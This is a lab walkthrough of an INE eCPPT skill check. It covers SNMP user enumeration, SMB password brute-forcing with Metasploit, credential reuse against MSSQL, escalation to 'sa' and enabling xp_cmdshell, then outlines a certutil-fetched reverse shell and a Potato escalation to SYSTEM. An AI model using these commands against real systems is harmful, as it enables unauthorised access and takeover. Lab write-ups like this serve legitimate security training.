**INE eCPPT Skill Check Lab â€” SNMP & Privilege Escalation â€” Flag 1 Walkthrough**

---

**Objective:** Obtain Flag 1 from the target system at `10.2.22.104`.

---

### Step 1 â€” SNMP Enumeration

* Tool: `snmpwalk`
* Community string: `blue`

**Command Executed:**

```
snmpwalk -v2c -c blue 10.2.22.104 1.3.6.1.4.1.77.1.2.25
```

**Result:**

* Enumerated valid users:

  * Guest
  * timothy
  * ssm-user
  * Administrator
  * DefaultAccount
  * WDAGUtilityAccount

---

### Step 2 â€” SMB Enumeration

* Tools: `smbclient`, `Metasploit smb_login` module

**SMB Null Session Test:**

```
smbclient -L //10.2.22.104 -N
```

Result: Access Denied

**SMB Login Brute Force with `timothy` account:**

```
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.2.22.104
set SMBUser timothy
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

**Valid Credentials Found:**

```
Username: timothy
Password: jordan
```

---

### Step 3 â€” SMB Share Enumeration with Valid Credentials

```
smbclient -L //10.2.22.104 -U timothy
```

**Shares Discovered:**

* ADMIN\$
* C\$
* IPC\$
* secrets

---

### Step 4 â€” Accessing `secrets` Share & Retrieving Flag 1

```
smbclient //10.2.22.104/secrets -U timothy
ls
get flag1.txt
```

**Flag 1 Retrieved:**

```
974a6ba2590c45e8b929fc86f676147e
```

---

### Step 5 â€” Additional Enumeration (Optional but Documented)

* Retrieved `mssql_creds.txt` containing credentials:

```
username: timmy
password: def_32121_@#
```
Here is the updated section of your report with the steps taken to achieve **Flag 2** and recommendations for next steps:

---

## **INE eCPPT Skill Check Lab â€” SNMP & Privilege Escalation â€” Flag 2 Walkthrough**

---

### Step 6 â€” Accessing MSSQL with Recovered Credentials

* Tool: `impacket-mssqlclient.py`

**Command Executed:**

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'timmy:def_32121_@#@10.2.18.250'
```

**Result:**

* Connected successfully as `guest` user
* Limited privileges â€” unable to run `sp_configure`, `OPENROWSET`, or `SELECT` on certain system tables

---

### Step 7 â€” Privilege Escalation via `EXECUTE AS LOGIN`

```sql
EXECUTE AS LOGIN = 'sa';
```

**Result:**

* Privileges escalated to `sa` user (db\_owner)

---

### Step 8 â€” Enabling and Using `xp_cmdshell`

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Command Execution via `xp_cmdshell`:**

```sql
EXEC xp_cmdshell 'type C:\flag2.txt';
```

**Flag 2 Retrieved:**

```
db2fd0fe52e54ab9b48d5dd2b313b030
```

---

## âœ… **Flag 2 Complete**

Successfully escalated from `guest` MSSQL user to `sa`, enabled command execution, and retrieved the flag.

---

## ðŸ”œ **Next Steps (Flag 3)**

Now that command execution is enabled on the target system:

1. **Establish a reverse shell** using a staged payload (e.g., PowerShell or a downloaded executable).

   * Example: Use `xp_cmdshell` with `certutil` to download and execute `shell.exe`
   * Ensure listener is active and correct port is not in use (`nc -lvnp 4444` or similar)
2. **Check privileges of the MSSQL service user:**

   * Already confirmed to be `NT SERVICE\MSSQL$SQLEXPRESS`
   * Has `SeImpersonatePrivilege` â€“ indicates **Juicy Potato/Rogue Potato** may be viable for privilege escalation to SYSTEM
3. **Upload and run privilege escalation binary** (e.g., `JuicyPotato.exe`) from within the reverse shell session
4. **Retrieve Flag 3** once SYSTEM access is obtained

